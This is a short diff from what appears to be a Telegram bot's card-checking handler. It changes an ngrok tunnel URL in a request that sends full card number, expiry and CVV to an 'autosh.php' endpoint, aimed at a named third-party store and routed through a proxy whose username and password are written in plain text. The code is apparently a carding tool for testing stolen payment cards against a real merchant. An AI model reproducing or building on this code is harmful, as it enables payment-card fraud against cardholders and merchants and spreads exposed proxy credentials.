@@ -2529,7 +2529,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- API URL ---
         api_url = (
-            f"https://7feeef80303d.ngrok-free.app/autosh.php"
+            f"https://edcae9ee471b.ngrok-free.app/autosh.php"
             f"?cc={cc}|{mm}|{yy}|{cvv}"
             "&site=https://tackletech3d.com"
             "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
